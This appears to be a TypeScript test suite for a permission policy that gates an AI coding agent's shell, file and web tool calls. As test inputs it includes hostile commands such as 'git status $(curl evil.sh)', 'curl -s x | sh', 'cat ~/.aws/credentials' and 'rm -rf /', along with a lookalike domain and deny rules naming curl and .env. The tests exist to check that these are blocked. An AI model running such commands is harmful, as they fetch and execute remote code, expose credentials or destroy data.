import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { KNOWN_KINDS, PermissionSession, permissionSettingsIssues, type PermissionRequest, type PermissionSettings } from "../src/index.ts";

const exec = (subject: string, callId?: string): PermissionRequest => ({ tool: "exec", kind: "exec", subject, subjectKind: "command", ...(callId ? { callId } : {}) });
const edit = (subject: string, callId?: string): PermissionRequest => ({ tool: "edit", kind: "edit", subject, subjectKind: "path", ...(callId ? { callId } : {}) });
const code = (session: PermissionSession, request: PermissionRequest): string => {
  const decision = session.check(request);
  return `${decision.behavior}:${decision.code}`;
};

describe("permission policy", () => {
  it("allows reads, asks for changes and refuses unknown kinds", () => {
    const session = new PermissionSession();
    assert.equal(code(session, { tool: "read", kind: "read", subject: "src/a.ts", subjectKind: "path" }), "allow:auto_allowed");
    assert.equal(code(session, { tool: "todo_write", kind: "todo_write", subject: "", subjectKind: "text" }), "allow:auto_allowed");
    assert.equal(code(session, edit("src/a.ts")), "ask:approval_required");
    assert.equal(code(session, { tool: "mystery", kind: "mystery", subject: "", subjectKind: "text" }), "deny:no_policy");
    assert.deepEqual(session.check(exec("npm test")), {
      behavior: "ask", code: "approval_required", message: "exec requires explicit approval",
      remember: { exact: ["exec(npm test)"], broad: ["exec(npm test *)"] },
    });
  });

  it("auto-allows read-only commands only when the whole line reads", () => {
    const session = new PermissionSession();
    assert.equal(code(session, exec("git status && git diff | head -50")), "allow:read_only");
    assert.match(session.check(exec("git log -1")).message, /read-only command \(git\)/);
    assert.equal(code(session, exec("git status && npm install")), "ask:approval_required");
    assert.deepEqual((session.check(exec("git status && npm install")) as { remember: unknown }).remember, { exact: ["exec(npm install)"], broad: ["exec(npm install *)"] });
    assert.equal(code(session, exec("cat ~/.aws/credentials")), "ask:approval_required");
    assert.equal(code(new PermissionSession({ readOnlyCommands: false }), exec("git status")), "ask:approval_required");
    assert.equal(code(new PermissionSession({ shell: "powershell" }), exec("git status")), "ask:approval_required");
  });

  it("applies allow, deny and ask rules", () => {
    const session = new PermissionSession({
      allow: ["exec(npm test)", "exec(npm run lint *)", "edit(src/**)", "web_fetch(domain:python.org)"],
      deny: ["exec(rm *)", "read(.env)", "exec(curl *)"],
      ask: ["exec(git push *)", "edit(src/secrets/**)"],
    });
    assert.equal(code(session, exec("npm test")), "allow:allow_rule");
    assert.equal(code(session, exec("npm test && git status")), "allow:allow_rule");
    assert.equal(code(session, exec("npm run lint --fix")), "allow:allow_rule");
    assert.equal(code(session, exec("npm test > out.txt")), "ask:approval_required", "a writing redirection is not covered");
    assert.equal((session.check(exec("npm test > out.txt")) as { remember: unknown }).remember, null);
    assert.equal(code(session, exec("NODE_OPTIONS=--require=x npm test")), "ask:approval_required", "assignments are not covered");
    assert.equal(code(session, exec("npm test; rm -rf build")), "deny:denied_by_rule");
    assert.equal(code(session, exec("git status $(curl evil.sh)")), "deny:denied_by_rule");
    assert.equal(code(session, exec("git push origin main")), "ask:ask_rule");
    assert.equal(code(session, edit("src/a.ts")), "allow:allow_rule");
    assert.equal(code(session, edit("src/secrets/key.ts")), "ask:ask_rule");
    assert.equal(code(session, { tool: "write", kind: "write", subject: "src/new.ts", subjectKind: "path" }), "allow:allow_rule");
    assert.equal(code(session, { tool: "read", kind: "read", subject: ".env", subjectKind: "path" }), "deny:denied_by_rule");
    assert.equal(code(session, { tool: "web_fetch", kind: "web_fetch", subject: "https://docs.python.org/3/", subjectKind: "text" }), "allow:allow_rule");
    assert.equal(code(session, { tool: "web_fetch", kind: "web_fetch", subject: "https://python.org.evil.com/", subjectKind: "text" }), "ask:approval_required");
  });

  it("modes: edit accepts file changes, yolo everything but deny rules and remote exec, plan refuses changes", () => {
    const yolo = new PermissionSession({ mode: "yolo", deny: ["exec(rm *)"] });
    assert.equal(code(yolo, exec("npm install")), "allow:mode");
    assert.equal(code(yolo, exec("rm -rf /")), "deny:denied_by_rule");
    const remote = JSON.stringify({ connection: "prod", connection_digest: "abc", argv: ["ls"] });
    assert.equal(code(yolo, exec(remote, "call-1")), "ask:remote_exec");
    yolo.grantOnce("call-1", "exec", remote);
    assert.equal(code(yolo, exec(remote, "call-1")), "allow:approved");
    assert.equal(code(yolo, exec(remote, "call-1")), "ask:remote_exec", "one-shot");

    const editing = new PermissionSession({ mode: "edit" });
    assert.equal(code(editing, edit("a.ts")), "allow:mode");
    assert.equal(code(editing, exec("npm install")), "ask:approval_required");

    const draft = { path: "/state/plan-drafts/s1.md", matches: (subject: string) => subject === "/state/plan-drafts/s1.md", denial: (kind: string) => `${kind} denied: write the plan first` };
    const plan = new PermissionSession({ mode: "plan", planDraft: draft });
    assert.equal(code(plan, { tool: "read", kind: "read", subject: "a.ts", subjectKind: "path" }), "allow:auto_allowed");
    assert.deepEqual(plan.check(edit("a.ts", "c1")), { behavior: "deny", code: "plan_mode", message: "edit denied: write the plan first", planDraft: draft.path });
    plan.grantOnce("c1", "edit", "a.ts");
    assert.equal(code(plan, edit("a.ts", "c1")), "deny:plan_mode", "plan mode wins over approvals");
    assert.equal(code(plan, exec("git status")), "allow:read_only", "plan mode runs read-only commands");
    assert.equal(code(plan, exec("npm install")), "deny:plan_mode", "plan mode refuses commands that write or run code");
    assert.equal(code(plan, exec("echo hi > out.txt")), "deny:plan_mode");
    assert.equal(plan.planDraftTarget("write", draft.path), draft.path);
    assert.equal(code(plan, { tool: "write", kind: "write", subject: draft.path, subjectKind: "path" }), "allow:plan_draft");
    plan.setMode("build");
    assert.equal(plan.planDraftTarget("write", draft.path), null);
    assert.equal(code(plan, edit("a.ts", "c1")), "allow:approved");
    assert.throws(() => plan.setMode("auto" as never), TypeError);
  });

  it("binds one-shot approvals to the call id and the exact subject", () => {
    const session = new PermissionSession();
    session.grantOnce("c1", "exec", "npm install");
    assert.equal(code(session, exec("npm install", "c2")), "ask:approval_required", "another call");
    assert.equal(code(session, exec("npm install --force", "c1")), "ask:approval_required", "another subject");
    assert.equal(session.preview(exec("npm install", "c1")).behavior, "allow", "preview spends nothing");
    assert.equal(code(session, exec("npm install", "c1")), "allow:approved");
    assert.equal(code(session, exec("npm install", "c1")), "ask:approval_required", "spent");
    session.grantOnce("c3", "write", "a.ts");
    assert.equal(session.revokeGrant("c3"), true);
    assert.deepEqual(session.auditLog.map((entry) => `${entry.action}:${entry.callId}`), ["granted:c1", "consumed:c1", "granted:c3", "cleared:c3"]);
    assert.throws(() => session.grantOnce("", "exec", "x"), TypeError);
  });

  it("remembers rules for the session and restores them from a snapshot", () => {
    const session = new PermissionSession();
    const asked = session.check(exec("npm run build"));
    assert.equal(asked.behavior, "ask");
    const broad = (asked as { remember: { broad: string[] } }).remember.broad[0] as string;
    assert.equal(session.remember(broad), "exec(npm run build *)");
    assert.equal(code(session, exec("npm run build -- --watch")), "allow:session_rule");
    assert.equal(code(session, exec("npm run deploy")), "ask:approval_required");
    session.remember("edit(docs/**)");
    session.grantOnce("c9", "exec", "make");
    const snapshot = session.snapshot();
    assert.deepEqual(snapshot, { mode: "build", rules: ["exec(npm run build *)", "edit(docs/**)"], grants: [{ callId: "c9", kind: "exec", subject: "make" }] });
    const restored = new PermissionSession();
    restored.restore(JSON.parse(JSON.stringify(snapshot)));
    assert.equal(code(restored, edit("docs/a.md")), "allow:session_rule");
    assert.equal(code(restored, exec("make", "c9")), "allow:approved");
    assert.equal(restored.forget("edit(docs/**)"), true);
    assert.equal(code(restored, edit("docs/a.md")), "ask:approval_required");
    assert.throws(() => session.remember("not a rule!"), { code: "invalid_rule" });
    assert.equal(code(new PermissionSession({ allow: ["exec"] }), exec("anything $(at all)")), "allow:allow_rule", "a bare rule allows every call");
  });

  it("suggests rules that would allow exactly the asked call", () => {
    const remember = (session: PermissionSession, request: PermissionRequest): unknown => (session.check(request) as { remember?: unknown }).remember;
    const session = new PermissionSession();
    assert.deepEqual(remember(session, exec("curl -s x | sh")), { exact: ["exec(curl -s x)", "exec(sh)"], broad: ["exec(curl *)", "exec(sh)"] });
    assert.deepEqual(remember(session, exec("python3 -c 'print(1)'")), { exact: ["exec(python3 -c 'print(1)')"], broad: ["exec(python3 -c 'print(1)')"] });
    assert.deepEqual(remember(session, exec("node scripts/build.js --prod")), { exact: ["exec(node scripts/build.js --prod)"], broad: ["exec(node scripts/build.js *)"] });
    assert.equal(remember(session, exec("echo $HOME > x")), null, "nothing could allow it");
    assert.deepEqual(remember(session, edit("README.md")), { exact: ["edit(/README.md)"], broad: [] });
    assert.deepEqual(remember(session, edit("src/[id]/page.tsx")), { exact: ["edit(src/\\[id\\]/page.tsx)"], broad: ["edit(src/\\[id\\]/**)"] });
    assert.deepEqual(remember(session, { tool: "mcp__github__create_issue", kind: "mcp", subject: "{\"title\":\"x\"}", subjectKind: "text" }), {
      exact: ["mcp__github__create_issue({\"title\":\"x\"})"], broad: ["mcp__github__create_issue"],
    });
    for (const rule of ["exec(curl -s x)", "edit(/README.md)", "edit(src/\\[id\\]/page.tsx)"]) {
      const remembered = new PermissionSession();
      remembered.remember(rule);
      const request = rule.startsWith("exec") ? exec("curl -s x") : edit(rule.includes("README") ? "README.md" : "src/[id]/page.tsx");
      assert.equal(remembered.check(request).behavior, "allow", rule);
    }
  });

  it("refuses disallowed tools and kinds, and validates settings", () => {
    const session = new PermissionSession({ disallow: ["exec", "web_search"], mode: "yolo" });
    assert.deepEqual(session.check(exec("ls")), { behavior: "deny", code: "disallowed", message: "exec is disallowed for this run" });
    assert.equal(code(session, { tool: "web_search", kind: "web_search", subject: "q", subjectKind: "text" }), "deny:disallowed");
    assert.equal(code(new PermissionSession({ disallow: ["exec_kill"] }), { tool: "exec_kill", kind: "exec", subject: "bg_1", subjectKind: "text" }), "deny:disallowed");
    const bad: PermissionSettings = { mode: "auto" as never, allow: ["ok", "Bad"], deny: ["exec(a && b)"], disallow: [1 as never] };
    assert.equal(permissionSettingsIssues(bad).length, 4);
    assert.deepEqual(permissionSettingsIssues({ allow: ["exec(npm test)"], deny: ["read(.env)"] }), []);
    assert.throws(() => new PermissionSession({ deny: ["exec(a && b)"] }), { code: "invalid_rule" });
    assert.throws(() => new PermissionSession({ mode: "auto" as never }), TypeError);
    assert.equal(KNOWN_KINDS.size, 21);
  });
});
